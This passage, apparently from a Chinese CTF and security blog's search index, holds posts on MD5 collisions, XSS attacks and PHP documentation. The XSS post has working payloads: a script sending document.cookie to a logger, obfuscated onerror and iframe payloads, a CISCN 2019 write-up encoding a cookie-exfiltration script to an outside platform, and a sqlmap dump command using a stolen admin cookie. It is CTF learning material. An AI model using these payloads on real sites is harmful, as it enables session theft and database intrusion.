class="token punctuation">(</span>POINTER<span class="token punctuation">)</span>x<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* Encodes input (UINT4) into output (unsigned char). Assumes len is  a multiple of 4. */</span><span class="token comment" spellcheck="true">/*将4字节的整数copy到字符形式的缓冲区中output：用于输出的字符缓冲区input：欲转换的四字节的整数形式的数组len：output缓冲区的长度，要求是4的整数倍*/</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>output<span class="token punctuation">,</span> UINT4 <span class="token operator">*</span>input<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span>  len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> j <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        output<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        output<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        output<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        output<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* Decodes input (unsigned char) into output (UINT4). Assumes len is  a multiple of 4. */</span><span class="token comment" spellcheck="true">/*与上面的函数正好相反，这一个把字符形式的缓冲区中的数据copy到4字节的整数中（即以整数形式保存）output：保存转换出的整数input：欲转换的字符缓冲区len：输入的字符缓冲区的长度，要求是4的整数倍*/</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Decode</span><span class="token punctuation">(</span>UINT4 <span class="token operator">*</span>output<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span>  len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span> j <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">)</span>        output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>UINT4<span class="token punctuation">)</span>input<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>UINT4<span class="token punctuation">)</span>input<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span>                    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>UINT4<span class="token punctuation">)</span>input<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>UINT4<span class="token punctuation">)</span>input<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    MD5_CTX md5<span class="token punctuation">;</span>    <span class="token function">MD5Init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>md5<span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">//初始化用于md5加密的结构</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> encrypt<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//存放于加密的信息</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> decrypt<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//存放加密后的结果</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>encrypt<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//输入加密的字符</span>    <span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>md5<span class="token punctuation">,</span>encrypt<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>encrypt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//对欲加密的字符进行加密</span>    <span class="token function">MD5Final</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">,</span><span class="token operator">&amp;</span>md5<span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token comment" spellcheck="true">//获得最终结果</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前:%s\n加密后:"</span><span class="token punctuation">,</span>encrypt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x "</span><span class="token punctuation">,</span>decrypt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n加密结束!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="MD5一些碰撞"><a href="#MD5一些碰撞" class="headerlink" title="MD5一些碰撞"></a>MD5一些碰撞</h4><pre><code>s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904</code></pre><p>碰撞得到两个md5一样的文件，使用fastcoll_v1.0.0.5.exe</p><pre><code>1.新建一个txt文件，内容为1234562.首先用cmd打开fastcoll_v1.0.0.5.exe -p 1.txt 生成payload文件</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Md5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站脚本攻击剖析与防御</title>
      <link href="/2019/11/19/xss-kua-zhan-jiao-ben-gong-ji-pou-xi-yu-fang-yu/"/>
      <url>/2019/11/19/xss-kua-zhan-jiao-ben-gong-ji-pou-xi-yu-fang-yu/</url>
      
        <content type="html"><![CDATA[<h4 id="cookie欺骗攻击"><a href="#cookie欺骗攻击" class="headerlink" title="cookie欺骗攻击"></a>cookie欺骗攻击</h4><p>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"cookie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Name<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>getcookie.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cookie1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$log</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"demo.txt"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$cookie1</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token delimiter">?></span></code></pre><p>payload,输入框输入</p><pre><code>&lt;script&gt;var img = document.createElement(&#39;img&#39;);img.src = &#39;http://localhost/getcookie.php?cookie=&#39;+encodeURIComponent(document.cookie);&lt;/script&gt;</code></pre><p>成功在demo.txt中获得cookie</p><h4 id="一些payload"><a href="#一些payload" class="headerlink" title="一些payload"></a>一些payload</h4><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>img src <span class="token operator">=</span> <span class="token string">"#"</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"x"</span> onerror<span class="token operator">=</span><span class="token string">"&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;"</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"1"</span> onerror<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span>原code<span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"1"</span> onerror<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"alert('xss')"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">""</span> onclick<span class="token operator">=</span><span class="token string">"alert(1)"</span><span class="token operator">></span>aaaaa<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">""</span> onclick<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29"</span><span class="token punctuation">)</span><span class="token operator">></span>aaaaa<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span> <span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>height<span class="token operator">=</span><span class="token number">0</span> width<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token operator">></span> <span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token number">1</span> onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span> y<span class="token operator">=</span><span class="token number">2016</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token operator">></span> </code></pre><h4 id="CISCN-2019-华东北赛区-Web2"><a href="#CISCN-2019-华东北赛区-Web2" class="headerlink" title="CISCN 2019 华东北赛区 Web2"></a>CISCN 2019 华东北赛区 Web2</h4><p>方法： 投稿-》反馈-》获得管理员cookie-》注入</p><p>HTML Markup转码</p><pre><code>in_str = &quot;(function(){window.location.href=&#39;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot;output = &quot;&quot;for c in in_str:    output += &quot;&amp;#&quot; + str(ord(c))print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)</code></pre><p>丢平台上后<br>然后爆破md5</p><pre><code>import hashlibfor i in range(1, 10000001):    s = hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()[0:6]    if s == &quot;4426f0&quot;:        print(i)        break</code></pre><p>置管理员 cookie，猜测后台路径，发现 /admin.php 能访问。<br>注入获取flag</p><pre><code>python sqlmap.py -u http://502ce080-5cd5-4c3d-8467-1fc354132f71.node3.buuoj.cn/admin.php?id=2 --cookie=&quot;PHPSESSID=57bd5e76b87b83da7e7332ad6f60cdd7&quot; -T flag --dump --flush-session--fresh-queries --fresh-queries --delay 0.1</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP文档的一些笔记</title>
      <link href="/2019/10/03/php-wen-dang-de-yi-xie-bi-ji/"/>
      <url>/2019/10/03/php-wen-dang-de-yi-xie-bi-ji/</url>
      
        <content type="html"><![CDATA[<h4 id="1-php短标记"><a href="#1-php短标记" class="headerlink" title="1.php短标记"></a>1.php短标记</h4><p>PHP 也允许使用短标记 <? 和 ?>，但不鼓励使用。只有通过激活 php.ini 中的 short_open_tag 配置指令或者在编译 PHP 时使用了配置选项 –enable-short-tags 时才能使用短标记。<br>短标记方式 开始<code>&lt;?</code> 和 结束<code>?&gt;</code>  (不推荐使用)  需要在php.ini文件中开启<br>SCRIPT风格  开始<code>&lt;script language=&quot;php&quot;&gt;  结束 &lt;/script&gt;</code> (不推荐使用) 不需要开启 可直接使用</p><a id="more"></a><h4 id="2-php末尾可以不加结束标记"><a href="#2-php末尾可以不加结束标记" class="headerlink" title="2.php末尾可以不加结束标记"></a>2.php末尾可以不加结束标记</h4><pre><code>如果文件内容是纯 PHP 代码，最好在文件末尾删除 PHP 结束标记。这可以避免在 PHP 结束标记之后万一意外加入了空格或者换行符，会导致 PHP 开始输出这些空白，而脚本中此时并无输出的意图。</code></pre><p>？？wtf什么玩意<br>查了一下原因</p><pre><code>PHP 解释器碰到 ?&gt; 结束标记时就简单地将其后内容原样输出，直到碰到下一个开始标记。PHP 会在输出时自动删除其结束符 ?&gt; 后的一个换行。该功能主要是针对在一个页面中嵌入多段 PHP 代码或者包含了无实质性输出的 PHP 文件而设计，与此同时也造成了一些疑惑。如果需要在 PHP 结束符 ?&gt; 之后输出换行的话，可以在其后加一个空格，或者在最后的一个 echo/print 语句中加入一个换行。这些影响最多的时候应该是在使用 include 和 require的时候</code></pre><h4 id="3-指令分隔符是否需要"><a href="#3-指令分隔符是否需要" class="headerlink" title="3.指令分隔符是否需要"></a>3.指令分隔符是否需要</h4><pre><code>同 C 或 Perl 一样，PHP 需要在每个语句后用分号结束指令。一段 PHP 代码中的结束标记隐含表示了一个分号；在一个 PHP 代码段中的最后一行可以不用分号结束。如果后面还有新行，则代码段的结束标记包含了行结束。 </code></pre><h4 id="4-注释"><a href="#4-注释" class="headerlink" title="4.注释"></a>4.注释</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token string">"This is a test"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// This is a one-line c++ style comment</span>    <span class="token comment" spellcheck="true">/* This is a multi line comment       yet another line of comment */</span>    <span class="token keyword">echo</span> <span class="token string">"This is yet another test"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'One Final Test'</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># This is a one-line shell-style comment</span><span class="token delimiter">?></span> </code></pre><h4 id="5-类型"><a href="#5-类型" class="headerlink" title="5.类型"></a>5.类型</h4><p>PHP 支持 9 种原始数据类型。<br>四种标量类型：<br>◦ boolean（布尔型）<br>◦ integer（整型）<br>◦ float（浮点型，也称作 double)<br>◦ string（字符串）  </p><p>三种复合类型：<br>◦ array（数组）<br>◦ object（对象）<br>◦ callable（可调用）  </p><p>最后是两种特殊类型：<br>◦ resource（资源）<br>◦ NULL（无类型）  </p><p>还有一些伪类型：<br>◦ mixed（混合类型）<br>◦ number（数字类型）<br>◦ callback（回调类型，又称为 callable）<br>◦ array|object（数组 | 对象类型）<br>◦ void （无类型） </p><h4 id="6-一大堆布尔值"><a href="#6-一大堆布尔值" class="headerlink" title="6.一大堆布尔值"></a>6.一大堆布尔值</h4><p>布尔值<br>要明确地将一个值转换成 boolean，用 (bool) 或者 (boolean) 来强制转换。但是很多情况下不需要用强制转换，因为当运算符，函数或者流程控制结构需要一个 boolean 参数时，该值会被自动转换。 </p><p>当转换为 boolean 时，以下值被认为是 FALSE：<br>◦ 布尔值 FALSE 本身<br>◦ 整型值 0（零）<br>◦ 浮点型值 0.0（零）<br>◦ 空字符串，以及字符串 “0”<br>◦ 不包括任何元素的数组<br>◦ 特殊类型 NULL（包括尚未赋值的变量）<br>◦ 从空标记生成的 SimpleXML 对象  </p><p>所有其它值都被认为是 TRUE（包括任何资源 和 NAN）。 </p><pre><code>&lt;?phpvar_dump((bool) &quot;&quot;);        // bool(false)var_dump((bool) 1);         // bool(true)var_dump((bool) -2);        // bool(true)var_dump((bool) &quot;foo&quot;);     // bool(true)var_dump((bool) 2.3e5);     // bool(true)var_dump((bool) array(12)); // bool(true)var_dump((bool) array());   // bool(false)var_dump((bool) &quot;false&quot;);   // bool(true)?&gt; </code></pre><h4 id="7-数值进制"><a href="#7-数值进制" class="headerlink" title="7.数值进制"></a>7.数值进制</h4><p>Warning<br>PHP 7 以前的版本里，如果向八进制数传递了一个非法数字（即 8 或 9），则后面其余数字会被忽略。PHP 7 以后，会产生 Parse Error。 </p><h4 id="8-NaN"><a href="#8-NaN" class="headerlink" title="8.NaN"></a>8.NaN</h4><p>某些数学运算会产生一个由常量 NAN 所代表的结果。此结果代表着一个在浮点数运算中未定义或不可表述的值。任何拿此值与其它任何值（除了 TRUE）进行的松散或严格比较的结果都是 FALSE。 </p><p>由于 NAN 代表着任何不同值，不应拿 NAN 去和其它值进行比较，包括其自身，应该用 is_nan() 来检查。 </p><h4 id="9-数组"><a href="#9-数组" class="headerlink" title="9.数组"></a>9.数组</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">"foo"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"bar"</span><span class="token punctuation">,</span>    <span class="token string">"bar"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"foo"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自 PHP 5.4 起</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"foo"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"bar"</span><span class="token punctuation">,</span>    <span class="token string">"bar"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"foo"</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><p> 没有键名的索引数组</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token string">"bar"</span><span class="token punctuation">,</span> <span class="token string">"hallo"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"foo"</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"bar"</span>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"hallo"</span>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"world"</span><span class="token punctuation">}</span></code></pre><h4 id="10-Object-对象"><a href="#10-Object-对象" class="headerlink" title="10.Object 对象"></a>10.Object 对象</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">foo</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">do_foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Doing foo."</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$bar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo</span><span class="token punctuation">;</span><span class="token variable">$bar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">do_foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><h4 id="11-引用赋值"><a href="#11-引用赋值" class="headerlink" title="11.引用赋值"></a>11.引用赋值</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span><span class="token variable">$bar</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$foo</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 合法的赋值</span><span class="token variable">$bar</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 非法; 引用没有名字的表达式</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">return</span> <span class="token number">25</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$bar</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 非法</span><span class="token delimiter">?></span> </code></pre><p>使用引用赋值，简单地将一个 &amp; 符号加到将要赋值的变量前（源变量）。<br>只有有名字的变量才可以引用赋值。 </p><h4 id="12-global-关键字"><a href="#12-global-关键字" class="headerlink" title="12.global 关键字"></a>12.global 关键字</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">Sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    